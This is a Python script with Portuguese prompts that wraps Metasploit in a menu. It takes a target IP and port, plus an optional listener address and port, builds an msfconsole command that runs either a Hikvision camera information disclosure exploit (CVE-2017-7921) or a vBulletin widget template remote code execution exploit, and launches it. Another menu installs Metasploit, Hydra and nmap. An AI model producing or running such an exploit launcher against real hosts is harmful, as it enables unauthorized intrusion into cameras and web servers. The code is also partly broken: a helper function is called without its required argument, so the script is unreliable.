import os
import sys

input("ATENÇÃO: Não use para fins maliciosos. Eu, como autor, não me responsabilizo. Pressione Enter para continuar.")
os.system("clear")

print("Feito por Kamy")
print('para sair precione ctrl + c')

def comandos(opcao):
    if opcao == '1': 
        print("Exploits disponíveis: 1-camera, 2-windows")
        exp = input("Escolha um exploit: ")
        if exp == '1':
            exp = 'auxiliary/gather/hikvision_info_disclosure_cve_2017_7921'
        elif exp == '2':
            exp = 'multi/http/vbulletin_widget_template_rce'
        else:
            input('valor invalido, pressione Enter...')
            menu()    
        os.system("clear")
        print(f"{exp} - Exploit selecionado")
        Rh = input("IP do alvo: ")
        print(f"Alvo: {Rh}")
        p = input("Porta a ser atacada: ")
        print(f"Porta: {p}")
        S = input("Seu IP (se necessário, dependendo do exploit): ")
        s = input("Sua porta: ")
        
        g = input("Continuar? (S/N): ").strip().lower()
        if g == 's':
            # Construção do comando msfconsole 
            comando = f"msfconsole -q -x 'use {exp}; set RHOSTS {Rh}; set RPORT {p};"
            if S:
                comando += f" set LHOST {S};"
            if s:
                comando += f" set LPORT {s};"
            comando += " exploit -j; exit'"
            print("Iniciando o Metasploit...")
            os.system(comando)
        elif g == 'n':
            print("Desfazendo alterações...")
            input("Pressione Enter para voltar ao menu...")
            os.system("clear")
        else:
            print("Opção inválida. Retornando ao menu.")
    elif opcao == '2':
        def cmd(op):
          os.system('clear')
        print("""
              s ~~~~~~~~~~~~~~~~~~
              |====_kamydk++=================|
              |1-update                      |
              |2-upgrade                      |  
              |3-atualizacao absoluta          |
              |4-metasploit                    |
              |5-hydra                        |
              |6-nmap                        /
              |99-voltar para o menu       _/
              |_ _ _ _ _ _ _ _ _ _ _ _ _ _|
              """)
        op = input('_kamy-toolsdk-->')
        cmd()
        if op == '1':
            os.system('sudo apt update')
            cmd()
        elif op == '2':
            os.system('sudo apt upgrade')    
            cmd()
        elif op == '3':
            os.system('sudo apt update -y && sudo apt upgrade')  
            cmd()
        elif op == '4':
            os.system('sudo apt install metasploit-framework')     
            menu() 
        elif op == '5':
            os.system('sudo apt install hydra')
            cmd()
        elif op == '6':
            os.system('sudo apt install nmap')
            cmd()
        elif op == '99':
            menu()
        else:
            cmd()
    elif opcao == '3':
        print("Selecione os números para executar as ferramentas.")
        c = input("Continuar? (S/N): ").strip().lower()
        if c == 's':
            menu()
        elif c == 'n':
            print("Obrigado por usar a ferramenta!")
            sys.exit()
        else:
            print("Opção inválida.")
    elif opcao == '4':
        print("Obrigado por usar a ferramenta!")
        sys.exit()
    else:
        print("Opção inválida. Tente novamente.")

def menu():
    print("""
        ==============================
           |/\/\/\/\/\/\/\/\/\|
               FERRAMENTAS   
        ==============================
         1 - msfconsole-simples
         2 - instalar ferramentas
         3 - ajuda
         4 - Sair
        ==============================
        -o para mais opcoes
        ==============================
     """)
    opcao = input("_kamydK--> ")
    comandos(opcao)

if __name__ == "__main__":
    while True:
        os.system("clear")
        menu()
